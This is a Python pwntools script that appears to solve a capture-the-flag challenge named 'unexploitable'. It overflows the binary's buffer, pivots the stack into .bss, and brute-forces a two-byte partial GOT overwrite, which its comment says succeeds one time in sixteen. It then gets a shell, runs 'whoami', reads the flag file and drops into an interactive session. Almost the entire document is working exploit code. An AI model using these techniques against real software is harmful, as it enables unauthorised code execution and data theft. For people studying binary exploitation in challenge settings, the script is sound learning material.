#!/usr/bin/env python3

from pwn import *
import os
exe = ELF("./unexploitable_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
leave = 0x400576
bss = 0x601028
main = 0x400544
t = 0x40055b
read_plt = 0x400430
wait = 0.2

#1/16 chance to succeed
while True:
	try:
		p = p64(0)*2 + p64(bss) + p64(t)	
		r = process("./unexploitable_patched")
		
		r.send(p.ljust(0x100,'\0'))
		p1 = p64(read_plt) + p64(0x601010)*2 + p64(t)
		r.send(p1.ljust(0x100,'\0'))
		p2 = "\x67\x55"
		r.send(p2)
		sleep(3)
		
		sleep(wait)
		r.sendline("echo pwn")
		sleep(wait)
		r.sendline("whoami")
		sleep(wait)
		r.sendline("cat /home/unexploitable/flag")
		
		if (r.can_recv(timeout = 2)):
			data = r.clean_and_log()
			log.info("SUCCESS: " + data)
			r.interactive()
	except:
		print("FAIL")
		r.close() 